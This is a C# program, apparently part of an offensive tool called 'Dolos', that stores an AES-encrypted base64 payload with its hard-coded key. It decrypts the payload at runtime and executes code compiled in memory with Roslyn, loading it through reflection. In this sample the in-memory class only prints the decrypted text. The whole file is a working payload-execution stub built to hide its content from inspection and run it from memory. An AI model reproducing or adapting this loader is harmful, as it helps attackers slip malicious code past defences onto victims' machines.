using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using Microsoft.CodeAnalysis.Emit;
namespace Dolos_Payload_Execution
{
    class Program
    {
        public static String Payload = "hzlC0odw+Sbg4t7va14mJWdmkyhLTLXE/dBAxMl3NXKLjV3KOZ0NOoNQ/m2ykaqzza8ltt5PcxfB1cK2bkYIRlSmddXDwe/pCJ+ZfBlVgRQMgT6LeBKa09tTvRQCCIY="; // Payload as a B64 String Encrypted Using Tool
        public static String Salt = "L3SM0TCSYTZ5K8GE97397K36EQKQO1TPYMPH6X2QMR3VLY032YY89XQA9VHKIVE6AJH8S8ILFMXQRHUPZQYZDUPB6PILQRH0M7VBR2L3QN3X99T1A1V16P2P4FBD075XE6DTWT86F4IZ12C75QKY6P47EGHM1IDTRFSC6AFR3YWCHDYCDEHJWH1YCGOPMVF71YHVJ9A5L24H31ZBSEIWA36KO39ZVZFHTZLS5C2DDL84MU5KQN7HNS6717HP9LKWWXYEQHGPMETZ5C848ZIH184A2N185ME2BLHZ504JGS4I9HBZ8NRKCC4Y2YMDPIT9A1XT4J8H49BJDWAULB9S53Z8RS6HO03895HITR4ZOJPDBVVGX11OIAEGBZCLM03EFCJIO2B4GKEVOW65"; // Use The Encryption Key Provided From The Tool

        static void Main(string[] args)
        {
            Execute();
        }
        public static void Execute()
        {
            SyntaxTree syntaxTree = CSharpSyntaxTree.ParseText(@"
                using System;
                namespace RoslynCompileSample
                {
                    public class Writer
                    {
                        public void Write(string message)
                        {
                            Console.WriteLine(message);
                        }
                    }
                }");

            string assemblyName = Path.GetRandomFileName();
            MetadataReference[] references = new MetadataReference[]
            {
                MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Enumerable).Assembly.Location)
            };

            CSharpCompilation compilation = CSharpCompilation.Create(
                assemblyName,
                syntaxTrees: new[] { syntaxTree },
                references: references,
                options: new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

            using (var ms = new MemoryStream())
            {
                EmitResult result = compilation.Emit(ms);

                if (!result.Success)
                {
                    IEnumerable<Diagnostic> failures = result.Diagnostics.Where(diagnostic =>
                        diagnostic.IsWarningAsError ||
                        diagnostic.Severity == DiagnosticSeverity.Error);

                    foreach (Diagnostic diagnostic in failures)
                    {
                        Console.Error.WriteLine("{0}: {1}", diagnostic.Id, diagnostic.GetMessage());
                    }
                }
                else
                {
                    ms.Seek(0, SeekOrigin.Begin);
                    Assembly assembly = Assembly.Load(ms.ToArray());

                    Type type = assembly.GetType("RoslynCompileSample.Writer");
                    object obj = Activator.CreateInstance(type);
                    type.InvokeMember("Write",
                        BindingFlags.Default | BindingFlags.InvokeMethod,
                        null,
                        obj,
                        new object[] { System.Text.Encoding.Default.GetString(System.Convert.FromBase64String(Crypto.Decrypt(Payload))) });
                }
            }

            Console.ReadLine();
        }
    }
    public class Crypto
    {
        private static String EncryptionKey = Program.Salt;
        public static Random rand = new Random();
        public static string Encrypt(string clearText)
        {
            byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (Aes encryptor = Aes.Create())
            {
                byte[] IV = new byte[15];
                rand.NextBytes(IV);
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }
                    clearText = Convert.ToBase64String(IV) + Convert.ToBase64String(ms.ToArray());
                }
            }
            return clearText;
        }
        public static string Decrypt(string cipherText)
        {
            byte[] IV = Convert.FromBase64String(cipherText.Substring(0, 20));
            cipherText = cipherText.Substring(20).Replace(" ", "+");
            byte[] cipherBytes = Convert.FromBase64String(cipherText);
            using (Aes encryptor = Aes.Create())
            {
                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, IV);
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);
                using (MemoryStream ms = new MemoryStream())
                {
                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(cipherBytes, 0, cipherBytes.Length);
                        cs.Close();
                    }
                    cipherText = Encoding.Unicode.GetString(ms.ToArray());
                }
            }
            return cipherText;
        }
    }

}
